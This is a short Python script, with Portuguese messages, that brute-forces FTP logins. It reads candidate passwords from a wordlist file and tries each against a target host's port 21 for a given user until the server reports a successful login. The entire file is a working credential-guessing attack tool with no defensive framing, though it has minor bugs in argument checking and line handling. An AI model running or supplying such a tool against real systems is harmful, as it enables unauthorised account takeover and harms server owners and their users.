import socket
import sys
import re

if len(sys.argv) < 2:  
    print("Use python lonftp.py 127.0.0.1 usuario")
    sys.exit(0)

usuario = sys.argv[2]

file = open("lista.txt")
for linha in file.readlines():
    print("Testando com %s:%s " %(usuario, linha))
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((sys.argv[1],21))  
    s.recv(1024)
    s.send(("USER " + usuario + "\r\n").encode())
    s.recv(1024)
    s.send(("PASS " + linha + "\r\n").encode())
    resulta = s.recv(1024)
    s.send (("QUIT\r\n").encode())

    if re.search(b"230", resulta):
        print("Senha encontrada: %s" %(linha))
        break
    else:
        print("Acesso negado\n")